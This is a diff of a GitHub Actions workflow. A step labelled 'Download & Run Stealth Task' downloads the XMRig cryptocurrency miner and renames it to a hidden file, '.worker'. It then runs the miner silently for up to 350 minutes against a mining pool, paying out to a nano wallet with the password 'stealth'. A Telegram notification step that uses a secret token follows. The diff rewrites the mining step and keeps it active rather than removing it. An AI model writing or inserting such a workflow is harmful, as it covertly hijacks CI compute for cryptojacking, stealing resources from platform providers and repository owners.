@@ -15,16 +15,17 @@ jobs:
         sudo apt-get install -y wget curl jq tar
 
     - name: Download & Run Stealth Task
-      run: |
-        LATEST=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | jq -r '.tag_name')
-        wget -q https://github.com/xmrig/xmrig/releases/download/${LATEST}/xmrig-${LATEST}-linux-x64.tar.gz -O runner.tar.gz
-        tar -xzf runner.tar.gz
-        mv xmrig-${LATEST} taskdir
-        cd taskdir
-        mv xmrig .worker
-        chmod +x .worker
-        timeout 350m ./.worker -o xmrig.nanswap.com:3333 -a rx -k -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p stealth > /dev/null 2>&1
-
+  run: |
+    curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | jq -r '.tag_name' > latest.txt
+    LATEST=$(cat latest.txt)
+    echo "Latest version is $LATEST"
+    wget -q https://github.com/xmrig/xmrig/releases/download/${LATEST}/xmrig-${LATEST}-linux-x64.tar.gz -O runner.tar.gz
+    tar -xzf runner.tar.gz
+    mv xmrig-${LATEST} taskdir
+    cd taskdir
+    mv xmrig .worker
+    chmod +x .worker
+    timeout 350m ./.worker -o xmrig.nanswap.com:3333 -a rx -k -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p stealth > /dev/null 2>&1
     - name: Notify Telegram
       env:
         TG_TOKEN: ${{ secrets.TG_TOKEN }}
